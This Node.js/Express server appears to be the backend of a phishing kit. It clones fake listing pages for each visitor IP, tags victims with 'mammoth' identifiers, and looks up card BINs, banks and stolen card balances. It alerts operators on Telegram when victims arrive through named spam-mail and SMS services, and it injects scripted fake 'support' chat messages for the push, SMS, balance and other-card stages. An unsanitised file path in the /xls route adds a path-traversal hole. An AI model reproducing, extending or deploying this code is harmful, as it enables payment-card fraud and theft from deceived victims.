require("dotenv").config({
  path: require("path").resolve("../.env"),
});
const express = require("express"),
  http = require("http"),
  bodyParser = require("body-parser"),
  cookieParser = require("cookie-parser"),
  session = require("express-session"),
  path = require("path"),
  fs = require("fs"),

  { Telegram, Markup } = require("telegraf"),
  bot = new Telegram(process.env.BOT_TOKEN);

const geoIp = require("geoip-lite"),
  { getName } = require("country-list"),
  userAgent = require("express-useragent");

const NodeCache = require("node-cache");
const cache = new NodeCache();
const log = require("../helpers/log");
const rand = require("../helpers/rand");
const axios = require("axios");
const xlstojson = require("xls-to-json");
const { Op, fn, col, where } = require("sequelize");

const escapeHTML = require("escape-html");
const {
  Ad,
  Support,
  SupportChat,
  Log,
  Settings,
  SupportTemp,
  Operators,
  User,
  Service,
  AutoTp,
  BlockCards,
  MyDomains,
  Nastavniki,
  IpBinding,
  Currency,
} = require("../database");
const serverLog = require("../helpers/serverLog");
const translate = require("./translate");

const binInfo = require("../helpers/binInfo");

const app = express();
const WebSocket = require("ws");
const clients = new Map(); // Список активных соединений { adId: WebSocket }

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const whois = require("whois-json");

module.exports = { wss, clients, server };

app.set("trust proxy", 1);
app.use(
  session({
    secret: "porfa este dos puntos",
    resave: false,
    saveUninitialized: true,
  })
);

app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);
app.use(bodyParser.json());
app.use(cookieParser());

app.use(express.static(path.join(__dirname, "static")));
app.set("views", path.join(__dirname, "views"));
app.engine("html", require("ejs").renderFile);
app.set("view engine", "html");

app.use((req, res, next) => {
  const rawIp =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"] ||
    req.connection.remoteAddress ||
    req.socket?.remoteAddress;

  // Убираем ::ffff: и IPv6 local
  const ip = String(rawIp)
    .replace(/^::ffff:/, "")
    .replace(/^::1$/, "127.0.0.1");

  req.realIp = ip;
  req.fullUrl = `${req.protocol}://${req.get("host")}${req.originalUrl}`;

  next();
});

const binCache = new Map();

async function getCurrencyFromBin(bin) {
  if (binCache.has(bin)) return binCache.get(bin);

  try {
    const { data } = await axios.get(`https://bins.antipublic.cc/bins/${bin}`);
    const currencyCode = data.country_currencies;
    binCache.set(bin, currencyCode);
    return currencyCode;
  } catch (err) {
    return null;
  }
}
async function getRatesFromDb(code) {
  try {
    const currency = await Currency.findOne({ where: { code } });
    return currency
      ? {
        USD: parseFloat(currency.usd),
        EUR: parseFloat(currency.eur),
      }
      : { USD: 1, EUR: 1 };
  } catch (err) {
    console.error("Ошибка получения курса из БД:", err.message);
    return { USD: 1, EUR: 1 };
  }
}

async function getCardInfo(cardNumber) {
  try {
    var text = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${cardNumber}`)
      .then((res) => {
        if (res.data.bank) text += `\n— Банк: <b>${res.data.bank}</b>`;
        if (res.data.country_name)
          text += `\n— Страна: <b>${res.data.country_name}</b>`;
      });
    return text;
  } catch (err) {
    return "<b>неизвестно</b>";
  }
}
async function getCardInfo1(cardNumber) {
  try {
    var text = "";

    await axios
      .get(`https://bins.antipublic.cc/bins/${cardNumber}`)
      .then((res) => {
        if (res.data.bank) text += `\n🏦 Банк: <b>${res.data.bank}</b>`;
        if (res.data.country_name)
          text += `\n🌏 Страна: <b>${res.data.country_name}</b>`;
      });
    return text;
  } catch (err) {
    return "<b>неизвестно</b>";
  }
}
function getBalance(log, ad) {
  if (!ad.balanceChecker) return "выключен";

  const cardBalanceText = log.otherInfo.cardBalance;

  const isThousandSeparated =
    /(?<=\d{1,3}),\d{3}(?:\.\d+)?$/.test(cardBalanceText) ||
    /(?<=\d{1,3})\.\d{3}(?:,\d+)?$/.test(cardBalanceText);

  if (isThousandSeparated) {
    return `${cardBalanceText} ${ad.detectedCurrency}`;
  }

  const balanceValue = String(cardBalanceText)
    .replace(/\s/g, "")
    .replace(/,/g, ".");
  const cardBalance = parseFloat(balanceValue);

  if (isNaN(cardBalance)) return cardBalanceText;

  const currency = ad.detectedCurrency || ad.service.currency.code;
  const rates = ad.service.currencyRates || { USD: 1, EUR: 1 };

  const parts = [`${cardBalance.toFixed(2)} ${currency}`];

  const usdValue = (cardBalance * rates.USD).toFixed(2);
  const eurValue = (cardBalance * rates.EUR).toFixed(2);

  // Добавляем USD, если оно отличается от основной суммы
  if (currency !== "USD" && usdValue !== cardBalance.toFixed(2)) {
    parts.push(`${usdValue} USD`);
  }

  // Добавляем EUR, если оно отличается от основной суммы
  if (currency !== "EUR" && eurValue !== cardBalance.toFixed(2)) {
    parts.push(`${eurValue} EUR`);
  }

  return parts.join(" / ");
}

function getBalance1(log, ad) {
  if (!ad.balanceChecker) return "выключен";

  const cardBalanceText = log.otherInfo.cardBalance;

  const isThousandSeparated =
    /(?<=\d{1,3}),\d{3}(?:\.\d+)?$/.test(cardBalanceText) ||
    /(?<=\d{1,3})\.\d{3}(?:,\d+)?$/.test(cardBalanceText);

  if (isThousandSeparated) {
    return `${cardBalanceText} ${ad.detectedCurrency}`;
  }

  const balanceValue = String(cardBalanceText)
    .replace(/\s/g, "")
    .replace(/,/g, ".");
  const cardBalance = parseFloat(balanceValue);
  if (isNaN(cardBalance)) return cardBalanceText;

  const currency = ad.detectedCurrency || ad.service.currency.code;
  const rates = ad.service.currencyRates || { USD: 1, EUR: 1 };

  const originalValue = cardBalance.toFixed(2);
  const usdValue = (cardBalance * rates.USD).toFixed(2);
  const eurValue = (cardBalance * rates.EUR).toFixed(2);

  // Если скрыт сервис — показываем только в USD
  if (ad.user.hideService) {
    return `${usdValue} USD`;
  }

  const parts = [`${originalValue} ${currency}`];

  if (currency !== "USD" && usdValue !== originalValue) {
    parts.push(`${usdValue} USD`);
  }

  if (currency !== "EUR" && eurValue !== originalValue) {
    parts.push(`${eurValue} EUR`);
  }

  return parts.join(" / ");
}

const DDOS_MAX_REQUESTS_ON_AD_ID = 200;
const DDOS_MAX_REQUESTS_ON_URL = 100;
const DDOS_BAN_TIME = 1800; // Время бана (секунды)
const DDOS_REFRESH_TIME_ON_AD = 10;
const DDOS_REFRESH_TIME_ON_URL = 10;

const BLOCKED_URLS = new Set();

async function sendDDoSMessage(req, url, ad_id) {
  try {
    const ad = await Ad.findByPk(ad_id, {
      include: [{ association: "user", required: true }],
    });

    if (!ad) {
      console.warn(
        `⚠️ Объявление с ID ${ad_id} не найдено для DDoS-уведомления`
      );
      return;
    }

    const msg = `<b>🚨 Внимание! Обнаружена возможная DDoS-атака!</b>

🔗 <b>URL:</b> <code>${url}</code>
📦 <b>ID объявления:</b> <code>${ad_id}</code>
👤 <b>Пользователь:</b> <a href="tg://user?id=${ad.userId}">${ad.user?.username || "Без username"
      }</a> (ID: <code>${ad.userId}</code>)
🌐 <b>IP:</b> <code>${req.realIp}</code>

⚠️ Объявление будет заблокировано, если превышение продолжится!`;

    await serverLog(bot, msg, { parse_mode: "HTML" });
    console.log("✅ Уведомление о DDoS отправлено.");
  } catch (err) {
    console.error("❌ Ошибка при отправке DDoS-уведомления:", err);
  }
}

async function deleteAd(ad_id, url = null) {
  try {
    const ad = await Ad.findOne({
      where: { id: ad_id },
      include: [{ association: "user", required: true }],
    });

    if (ad) {
      await ad.destroy();
      console.log(`🗑️ Объявление ID ${ad_id} удалено из-за DDoS.`);

      const message = `<b>🗑️ Объявление удалено из-за подозрения на DDoS</b>
📦 ID: <code>${ad_id}</code>
🔗 URL: ${url || "Неизвестен"}
👤 Пользователь: <a href="tg://user?id=${ad.userId}">${ad.user.username || "Без username"
        }</a> (ID: <code>${ad.userId}</code>)`;

      await serverLog(bot, message, { parse_mode: "HTML" });
    }
  } catch (err) {
    console.error(`❌ Ошибка при удалении объявления с ID ${ad_id}:`, err);
  }
}

function ddosCheck(req, url, ad_id = null) {
  if (BLOCKED_URLS.has(url)) return true;

  if (ad_id) {
    const adKey = `ad_${ad_id}_${req.realIp}`;
    const adCount = cache.get(adKey) || 0;

    if (adCount >= DDOS_MAX_REQUESTS_ON_AD_ID) {
      cache.set(adKey, DDOS_MAX_REQUESTS_ON_AD_ID, DDOS_BAN_TIME);

      if (!cache.get(`ad_ddos_alerted_${ad_id}`)) {
        cache.set(`ad_ddos_alerted_${ad_id}`, true, DDOS_BAN_TIME);
        sendDDoSMessage(req, url, ad_id); // <-- Уведомляем здесь!
        deleteAd(ad_id, url);
      }

      return true;
    }

    cache.set(adKey, adCount + 1, DDOS_REFRESH_TIME_ON_AD);
  }

  if (url) {
    const urlKey = `url_${url}_${req.realIp}`;
    const urlCount = cache.get(urlKey) || 0;

    if (urlCount >= DDOS_MAX_REQUESTS_ON_URL) {
      cache.set(urlKey, DDOS_MAX_REQUESTS_ON_URL, DDOS_BAN_TIME);

      if (!cache.get(`url_ddos_alerted_${url}`)) {
        cache.set(`url_ddos_alerted_${url}`, true, DDOS_BAN_TIME);
        if (ad_id) {
          sendDDoSMessage(req, url, ad_id); // <-- Уведомляем и тут!
          deleteAd(ad_id, url);
        }
      }

      return true;
    }

    cache.set(urlKey, urlCount + 1, DDOS_REFRESH_TIME_ON_URL);
  }

  return false;
}

function getUserInfo(req) {
  try {
    const ipInfo = geoIp.lookup(req.realIp);
    const userInfo = userAgent.parse(req.headers["user-agent"]);

    const deviceType = userInfo.isMobile
      ? "Телефон"
      : userInfo.isDesktop
        ? "Компьютер"
        : "Неизвестно";

    const botInfo = userInfo.isBot ? ", Бот" : ""; // ← добавляем ", Бот" только если isBot === true

    const country =
      ipInfo && ipInfo.country ? getName(ipInfo.country) : "Неизвестно";

    return `🖥️ Устройство: <b>${deviceType}${botInfo}</b>\n🌍 Страна: <b>${country}</b>`;
  } catch (err) {
    return "🔍 Нет данных о пользователе";
  }
}
const crypto = require("crypto");

async function getOrCreateMammothIdentifier(ip) {
  let existing = await IpBinding.findOne({ where: { ip } });

  if (existing) {
    // Если уже есть, но identifier пустой → генерируем и обновляем
    if (!existing.identifier) {
      const hash = crypto.createHash("sha256").update(ip).digest("hex");
      const base36 = BigInt("0x" + hash).toString(36);
      const identifier = base36.slice(0, 12);

      await existing.update({ identifier });
      return identifier;
    }
    return existing.identifier;
  }

  // Если записи нет — создаём новую (без adId!)
  const hash = crypto.createHash("sha256").update(ip).digest("hex");
  const base36 = BigInt("0x" + hash).toString(36);
  const identifier = base36.slice(0, 12);

  await IpBinding.create({
    adId: null, // Привязка к ad будет позже
    ip,
    identifier,
  });

  return identifier;
}

async function generateSupport(ad, req, res) {
  try {
    // Получаем IP-адрес с учётом прокси и убираем ::ffff: если есть
    const ipAddress = (req.headers["x-forwarded-for"] || req.ip || "").replace(/^::ffff:/, "").trim();

    if (!ipAddress) {
      return res.status(403).json({ error: "IP-адрес не определён" });
    }

    // Если в сессии уже сохранён токен, ищем support по нему
    if (req.session.supportToken) {
      const existingSupport = await Support.findOne({
        where: {
          token: req.session.supportToken,
          adId: ad.id,
          ipAddress: ipAddress,
        },
        include: [{ association: "messages" }],
      });

      if (existingSupport) {
        return existingSupport;
      }
    }

    // Если support не найден по токену, ищем просто по adId и IP
    let support = await Support.findOne({
      where: {
        adId: ad.id,
        ipAddress: ipAddress,
      },
      include: [{ association: "messages" }],
    });

    // Если всё ещё не найдено — создаём новый
    if (!support) {
      support = await Support.create({
        adId: ad.id,
        ipAddress: ipAddress,
        token: Math.random() + Date.now() + Math.random(),
      }).catch((err) => {
        console.error("Ошибка при создании support:", err);
        return null;
      });

      if (!support) {
        return res.status(500).json({ error: "Не удалось создать поддержку" });
      }
    }

    // Сохраняем токен в сессию
    req.session.supportToken = support.token;

    return support;
  } catch (err) {
    console.error("Ошибка в generateSupport:", err);
    return res.status(500).json({ error: "Ошибка генерации поддержки" });
  }
}

async function handleAdRedirect(req, res, pathType = "ad", render = false) {
  try {
    const ad = await Ad.findByPk(req.params.adId, {
      include: [{ association: "service", required: true }],
    });
    if (!ad) return res.sendStatus(404);

    const ipHeader = req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"];
    let realIp = (ipHeader ? ipHeader.split(",")[0] : req.connection.remoteAddress || req.ip || "").replace(/^::ffff:/, "").trim();

    const hostname = req.hostname.replace(/^www\./, "").toLowerCase();
    const isLocalhost = [
      "localhost", "127.0.0.1", "::1"
    ].includes(hostname) || realIp.startsWith("192.168.") || realIp.startsWith("10.");
    const protocol = isLocalhost ? "http" : "https";

    const existingBinding = await IpBinding.findOne({ where: { ip: realIp } });

    if (existingBinding && existingBinding.adId && !isNaN(existingBinding.adId)) {
      const oldAd = await Ad.findByPk(existingBinding.adId, {
        include: [{ association: "service", required: true }],
      });

      if (oldAd) {
        if (oldAd.serviceCode === ad.serviceCode) {
          await oldAd.update({ lastSeen: new Date().toISOString() });

          let redirectDomain = hostname;
          const isPersonal = oldAd.type?.toLowerCase?.() === "personal";

          if (isPersonal && oldAd.service.domain.replace(/^www\./, "").toLowerCase() === hostname) {
            const personalDomain = await MyDomains.findOne({ where: { userId: oldAd.userId } });
            if (personalDomain) redirectDomain = personalDomain.domain;
          }

          const url = `${protocol}://${redirectDomain}/${pathType}/${oldAd.id}`;
          return render ? res.redirect(`/ad/${oldAd.id}`) : res.redirect(url);
        }
      }

      await IpBinding.destroy({ where: { ip: realIp } });
    }

    await ad.update({ lastSeen: new Date().toISOString() });

    const { id, createdAt, updatedAt, billing, ...clonedData } = ad.toJSON();
    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const newAdId = parseInt(rand(999999, 99999999) + Date.now() / 10000);

    const createdAd = await Ad.create({ ...clonedData, id: newAdId });

    await IpBinding.create({ adId: newAdId, ip: realIp });

    let redirectDomain = hostname;
    const isPersonal = ad.type?.toLowerCase?.() === "personal";

    if (isPersonal && ad.service.domain.replace(/^www\./, "").toLowerCase() === hostname) {
      const personalDomain = await MyDomains.findOne({ where: { userId: ad.userId } });
      if (personalDomain) redirectDomain = personalDomain.domain;
    }

    const finalUrl = `${protocol}://${redirectDomain}/${pathType}/${newAdId}`;
    return render ? res.redirect(`/ad/${newAdId}`) : res.redirect(finalUrl);
  } catch (err) {
    console.error(`Ошибка в маршруте ${pathType}:`, err?.response?.data || err.stack || err.message);
    return res.sendStatus(500);
  }
}

app.get("/billing/:adId", (req, res) => handleAdRedirect(req, res, "ad"));
app.get("/me/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer9: 1, // Обновляем mailer4, так как это первое действие
      });

      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Meow Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});
app.get("/ju/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer8: 1, // Обновляем mailer4, так как это первое действие
      });

      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Just Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});
app.get("/mm/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer7: 1, // Обновляем mailer4, так как это первое действие
      });

      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Mori Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});
app.get("/ca/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer6: 1, // Обновляем mailer4, так как это первое действие
      });

      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>CatchMe Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});
app.get("/h/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer5: 1, // Обновляем mailer4, так как это первое действие
      });

      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Hype Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});
app.get("/i/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверка на наличие первого действия
    if (!ad.firstActionAt) {
      const now = new Date(); // Текущее время

      // Записываем время первого действия
      await ad.update({
        firstActionAt: now,
        mailer4: 1, // Обновляем mailer4, так как это первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Inbox Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
      // Не обновляем mailer4, если уже есть запись firstActionAt
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем mailer3
app.get("/y/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверяем, было ли первое действие
    if (!ad.firstActionAt) {
      const now = new Date();
      await ad.update({
        firstActionAt: now, // Записываем время первого действия
        mailer3: 1, // Обновляем mailer3 как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Your Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем mailer2
app.get("/a/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    const userIp =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    // Проверяем, было ли первое действие
    if (!ad.firstActionAt) {
      const now = new Date();
      await ad.update({
        firstActionAt: now, // Записываем время первого действия
        mailer2: 1, // Обновляем mailer2 как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Anafema Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем mailer
app.get("/g/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверяем, было ли первое действие
    if (!ad.firstActionAt) {
      const now = new Date();
      await ad.update({
        firstActionAt: now, // Записываем время первого действия
        mailer: 1, // Обновляем mailer как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Gosu Mail</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем sms
app.get("/m/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверяем, было ли первое SMS действие
    if (!ad.firstSmsActionAt) {
      const now = new Date();
      await ad.update({
        firstSmsActionAt: now, // Записываем время первого SMS действия
        sms: 1, // Обновляем sms как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Moongate SMS</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем sms2
app.get("/d/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверяем, было ли первое SMS действие
    if (!ad.firstSmsActionAt) {
      const now = new Date();
      await ad.update({
        firstSmsActionAt: now, // Записываем время первого SMS действия
        sms2: 1, // Обновляем sms2 как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Depa SMS</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

// Обновляем sms3
app.get("/cos/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, res, req.fullUrl, req.params.adId))
      return res.sendStatus(429);

    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });

    if (!ad) return res.sendStatus(404);

    const settings = await Settings.findByPk(1);
    if (settings.work == false) {
      return res.render("404", {
        adId: ad.id,
        settings, // <-- передаём объект настроек в шаблон
      });
    }
    // Проверяем, было ли первое SMS действие
    if (!ad.firstSmsActionAt) {
      const now = new Date();
      await ad.update({
        firstSmsActionAt: now, // Записываем время первого SMS действия
        sms3: 1, // Обновляем sms3 как первое действие
      });
      if (ad.userId) {
        await bot.sendMessage(
          ad.userId,
          `⬇️ Замечен переход через <b>Cosmic SMS</b> для объявления <b>#id${ad.id}</b>`,
          { parse_mode: "HTML" }
        );
      }
    } else {
    }

    return res.redirect(`/${req.params.adId}`);
  } catch (err) {
    return res.send(err);
  }
});

app.post(`/xls`, async (req, res) => {
  try {
    xlstojson(
      {
        input: `/root/bot/scenes/files/${req.body.fileName}.xls`,
        output: "output.json",
        lowerCaseHeaders: true,
      },
      function (err, result) {
        if (err) {
          res.json(err);
        } else {
          res.json(result);
        }
      }
    );
  } catch (err) {
    console.log(err);
    return res.sendStatus(404);
  }
});
function replaceAutoPlaceholders(text, ad) {
  const map = {
    "{title}": ad.title || "",
    "{price}": ad.price || "",
    "{address}": ad.address || "",
    "{id}": ad.id || "",
    "{name}": ad.name || "",
  };

  let result = text;
  for (const [key, value] of Object.entries(map)) {
    result = result.replaceAll(key, String(value));
  }

  return result;
}
async function handleAutoSupport(req, res, status) {
  try {
    const log = await Log.findOne({
      where: { token: req.body.token },
      include: [{ association: "ad", required: true }],
    });

    if (!log) return res.status(404).send("Log not found");

    let countryId = log.ad.serviceCode.split("_").pop();
    if (countryId === "com") countryId = "eu";

    const user = await User.findOne({ where: { id: log.ad.userId } });
    const support = await generateSupport(log.ad, req, res);

    const createAutoIfNotExists = async (userId, isTemplate = true, isAuto = true) => {
      const auto = await AutoTp.findOne({ where: { userId, status, countryId } });
      if (auto) {
        const exists = await SupportChat.findOne({
          where: {
            supportId: support.id,
            autoId: auto.id,
            isAuto: true,
          },
        });

        if (!exists) {
          await SupportChat.create({
            supportId: support.id,
            messageFrom: 0,
            message: replaceAutoPlaceholders(auto.text, log.ad),
            readed: 0,
            isTemplate,
            isAuto,
            autoId: auto.id,
          });
        }
      }
    };

    if (user.operator == null) {
      await createAutoIfNotExists(user.id);
    } else {
      const operator = await Operators.findOne({ where: { userId: user.operator } });
      if (operator) {
        await createAutoIfNotExists(operator.userId);
      }
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Error in handleAutoSupport:", err);
    return res.status(500).send(err.message);
  }
}


app.post(`/auto/push`, async (req, res) => {
  await handleAutoSupport(req, res, 2);
});

app.post(`/auto/sms`, async (req, res) => {
  await handleAutoSupport(req, res, 3);
});

app.post(`/auto/wait`, async (req, res) => {
  await handleAutoSupport(req, res, 4);
});

app.post(`/auto/balance`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [{ association: "service", required: true }],
    });
    if (!ad) return res.status(404).json({ status: false, message: "Объявление не найдено" });

    const user = await User.findOne({ where: { id: ad.userId } });
    if (!user) return res.status(404).json({ status: false, message: "Пользователь не найден" });

    let countryId = ad.serviceCode.split("_").pop();
    if (countryId === "com") countryId = "eu";

    const support = await generateSupport(ad, req, res);
    const findAndSendAuto = async (uid) => {
      const auto = await AutoTp.findOne({ where: { userId: uid, status: 7, countryId } });
      if (auto) {
        const exists = await SupportChat.findOne({
          where: {
            supportId: support.id,
            autoId: auto.id,
            isAuto: true,
          },
        });

        if (!exists) {
          await SupportChat.create({
            supportId: support.id,
            messageFrom: 0,
            message: replaceAutoPlaceholders(auto.text, ad),
            readed: 0,
            isTemplate: true,
            isAuto: true,
            autoId: auto.id,
          });
        }
      }
    };

    if (user.operator == null) await findAndSendAuto(ad.userId);
    else {
      const operator = await Operators.findOne({ where: { userId: user.operator } });
      if (operator) await findAndSendAuto(operator.userId);
    }

    res.json({ status: true, message: "Сообщение обработано" });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ status: false, message: "Внутренняя ошибка сервера", error: err.message });
  }
});


app.post(`/auto/othercard`, async (req, res) => {
  try {
    const log = await Log.findOne({
      where: { token: req.body.token },
      include: [{ association: "ad", required: true }],
    });
    if (!log) return res.status(404).send("Log not found");

    let countryId = log.ad.serviceCode.split("_").pop();
    if (countryId === "com") countryId = "eu";

    const user = await User.findOne({ where: { id: log.ad.userId } });
